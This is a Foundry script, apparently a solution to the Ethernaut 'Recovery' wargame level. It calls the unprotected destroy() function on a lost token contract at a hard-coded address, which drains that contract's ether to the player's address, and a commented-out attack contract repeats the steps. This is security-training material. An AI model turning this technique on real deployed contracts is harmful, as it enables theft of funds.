// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/EthernautRecovery.sol";

contract RecoverySolution is Script {
    // Recovery victim = Recovery(0x40e7E3Fc49d7597350AC7463849081Ea24ebb57F);
    // RecoveryAttack attack;

    /**
     * @notice search the lost contract using etherscan is approachable. The goal is to call destroy function at the very first lost contract generated
     */
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // attack = new RecoveryAttack{value: 0.0001 ether}(
        //     payable(vm.envAddress("MY_ADDRESS"))
        // );
        // victim.generateToken("AttackToken", 10000000);
        // console.log("Balance of recovery contract", address(victim).balance);
        // (bool success, ) = address(
        //     SimpleToken(payable(0x563683dbB2C5C7b068123b623Cd4E78D2c6E9D47))
        // ).call{value: 0.0001 ether}("");
        // require(success, "Call failed");
        console.log(
            "Balance of lost contract before destroyed",
            address(0x4AD5AFE6dc3d54610309e14AFA4974C63Bd9b77D).balance
        );
        SimpleToken(payable(0x4AD5AFE6dc3d54610309e14AFA4974C63Bd9b77D)) // Simulate the transaction first before broadcasting to know the lost contract address
            .destroy(payable(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
        console.log(
            "Balance of lost contract",
            address(0x4AD5AFE6dc3d54610309e14AFA4974C63Bd9b77D).balance
        );
    }
}

// contract RecoveryAttack {
//     Recovery victim = Recovery(0x40e7E3Fc49d7597350AC7463849081Ea24ebb57F);

//     constructor(address payable receiver) payable {
//         victim.generateToken("AttackToken", 10000000);
//         console.log("Balance of recovery contract", address(victim).balance);
//         (bool success, ) = address(
//             SimpleToken(payable(0x563683dbB2C5C7b068123b623Cd4E78D2c6E9D47))
//         ).call{value: 0.0001 ether}("");
//         require(success, "Call failed");
//         console.log(
//             "Balance of lost contract before destroyed",
//             address(0x563683dbB2C5C7b068123b623Cd4E78D2c6E9D47).balance
//         );
//         SimpleToken(payable(0x563683dbB2C5C7b068123b623Cd4E78D2c6E9D47)) // Simulate the transaction first before broadcasting to know the lost contract address
//             .destroy(payable(receiver));
//         console.log(
//             "Balance of lost contract",
//             address(0x563683dbB2C5C7b068123b623Cd4E78D2c6E9D47).balance
//         );
//     }
// }
